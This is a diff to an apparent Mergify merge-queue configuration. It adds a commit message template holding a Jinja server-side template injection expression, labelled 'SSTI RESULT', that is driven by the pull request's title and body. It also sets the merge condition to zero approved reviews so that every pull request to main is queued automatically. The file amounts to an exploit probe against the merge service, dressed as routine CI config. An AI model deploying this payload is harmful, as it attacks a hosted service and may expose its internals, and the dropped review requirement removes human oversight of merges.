@@ -1,13 +1,22 @@
+queue_rules:
+  - name: default
+    queue_conditions:
+      - base=main
+    merge_conditions:
+      - "#approved-reviews-by>=0"
+    merge_method: merge
+    commit_message_template: |
+      {% if title and body %}
+      SSTI RESULT: {{ (([dict]|map(attribute=title))|first)[body].keys()|list }}
+      {% endif %}
+
+merge_queue:
+  max_parallel_checks: 1
+
 pull_request_rules:
-  - name: debug-simple
+  - name: debug-auto-merge
     conditions:
       - base=main
     actions:
-      comment:
-        message: "DEBUG SIMPLE: rule triggered successfully"
-  - name: debug-template
-    conditions:
-      - base=main
-    actions:
-      comment:
-        message: "DEBUG TEMPLATE: title is '{{ title }}' and body is '{{ body }}'"
+      queue:
+        name: default
